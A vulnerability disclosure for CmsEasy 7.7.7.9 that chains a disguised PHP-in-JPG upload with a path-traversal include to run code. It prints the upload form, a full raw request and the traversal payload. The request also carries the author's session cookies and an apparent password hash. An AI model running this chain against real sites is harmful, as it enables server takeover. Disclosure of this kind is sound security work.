

CmsEasy 7.7.7.9 has a code execution vulnerability in the background.

Start with the getannounlist_action method in /lib/admin/template_admin.php，

![image-20240407222821022](https://github.com/XiLitter/CMS_vulnerability-discovery/blob/main/easycms4.png)

There is a controlled path, and in the _eval function below, there is an include

![CMS_vulnerability-discovery/easycms4.png 在 main ·XiLitter/CMS_vulnerability-discovery ·GitHub上](https://github.com/XiLitter/CMS_vulnerability-discovery/blob/main/easycms5.png)

The next step is to find a place to upload。

There is a file upload in the swfsave_action method of /lib/admin/file_admin.php

![CMS_vulnerability-discovery/easycms4.png 在 main ·XiLitter/CMS_vulnerability-discovery ·GitHub上](https://github.com/XiLitter/CMS_vulnerability-discovery/blob/main/easycms6.png)

And the path is output

You can upload an image, the content is malicious php code, and then use the file containing the execution of malicious code

Vulnerability recurrence process：

First construct a form for our upload

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>POST数据包POC</title>
</head>
<body>
<form action="http://localhost:7080/index.php?case=file&act=swfsave&admin_dir=admin" method="post" enctype="multipart/form-data">
<!--链接是当前打开的题目链接-->
    <label for="file">文件名：</label>
    <input type="file" name="file" id="file"><br>
    <input type="submit" name="submit" value="提交">
</form>
</body>
</html>
```

The request packet is constructed as follows

Notice The uploaded field name is changed to Filedata

```
POST /index.php?case=file&act=swfsave&admin_dir=admin HTTP/1.1
Host: localhost:7080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------229919673223710763291201029181
Content-Length: 357
Origin: http://localhost
Connection: close
Referer: http://localhost/
Cookie: _ga=GA1.1.411633462.1675085596; Idea-471eb550=698bfe4b-232c-4352-9e3d-fe02464850ff; USER_NAME_COOKIE=admin; SID_1=a8b953b4; ajs_anonymous_id=2bad451d-4aa2-4ea8-9093-b89e3986a36e; ajs_user_id=048546bfc1e19205a55a5993547bc9308acf5a9c; Pycharm-1482e871=15e26aac-0918-491d-9086-904339580e27; Phpstorm-a18e6472=137e6e51-3adf-42a0-b6fb-860f31ab39a0; UserName=xilitter; PassWord=e10adc3949ba59abbe56e057f20f883e; userid=1; t00ls=e54285de394c4207cd521213cebab040; t00ls_s=YTozOntzOjQ6InVzZXIiO3M6MjY6InBocCB8IHBocD8gfCBwaHRtbCB8IHNodG1sIjtzOjM6ImFsbCI7aTowO3M6MzoiaHRhIjtpOjE7fQ%3D%3D; zzz629_adminpass=0; zzz629_adminname=admin; zzz629_admintime=1712306735; zzz629_adminface=..%2Fplugins%2Fface%2Fface01.png; zzz417_adminpass=0; zzz417_adminname=admin; zzz417_admintime=1712308843; zzz417_adminface=..%2Fplugins%2Fface%2Fface02.png; admin_login_username=admin; iframeScroll=; bosscmsuid=ro8rad75; bosscmsuidas=f1c2ab9ee32382c9e2; iframeContentTreeScroll=322; remember-me=YWRtaW46MTcxMzg2MjA5MzAzMDpkYzdkZGU0NzIzNTI5MGE3ZjRkYjEyNGQ1MDM1MzBkYg; _jspxcms=96f13cf433dd4e33af1490b0f0559103; PHPSESSID=18cspd5qgknap1o2m98vemm1fd; login_username=admin; login_password=x64qGia1U2066t7zGv89FioVcipyFu8ZIzIEN5I2LhKZi2ab18391e6e61e99aff8e10d05e4ad02
Upgrade-Insecure-Requests: 1

-----------------------------229919673223710763291201029181
Content-Disposition: form-data; name="Filedata"; filename="123.jpg"
Content-Type: image/jpeg

<?=phpinfo();?>
-----------------------------229919673223710763291201029181
Content-Disposition: form-data; name="submit"

鎻愪氦
-----------------------------229919673223710763291201029181--
```

Returned to the upload path after sending the request packet

![CMS_vulnerability-discovery/easycms4.png 在 main ·XiLitter/CMS_vulnerability-discovery ·GitHub上](https://github.com/XiLitter/CMS_vulnerability-discovery/blob/main/easycms7.png)

Use the following payload for file inclusion:

```
http://localhost:7080/index.php?case=template&act=getannounlist&admin_dir=admin

POST:
annountemplate=/../../../../../../cn/upload/images/202404/17133203964999.jpg
```

You can see that the malicious code was successfully executed

![CMS_vulnerability-discovery/easycms4.png 在 main ·XiLitter/CMS_vulnerability-discovery ·GitHub上](https://github.com/XiLitter/CMS_vulnerability-discovery/blob/main/easycms8.png)

